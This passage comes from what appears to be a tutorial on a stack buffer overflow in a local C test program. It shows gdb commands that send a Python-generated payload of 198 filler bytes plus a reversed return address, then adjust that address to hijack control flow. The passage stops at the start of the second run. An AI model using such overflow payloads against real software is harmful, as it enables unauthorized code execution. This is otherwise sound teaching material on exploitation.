...
and last part is starting memory address. If we run it we can see nothing out of ordinary happens but printf function shows something weird:
```shell
(gdb) r $(python -c 'print "" + "A" * 198 + "\x7f\xff\xff\xff\xdd\xd0"[::-1]')
...
We see a memory address printed in the middle from code in our c file and this is the new starting memory location 0x7fffffffddf0. Now if we adjust
our payload and run we can see a process is run that should not be run:
```shell
(gdb) r $(python -c 'print "" + "A" * 198 + "\x7f\xff\xff\xff\xdd\xf0"[::-1]')
Starting program: /home/arun/Desktop/pt1 $(python -c 'print "" + "A" * 198 + "\x7f\xff\xff\xff\xdd\xf0"[::-1]')
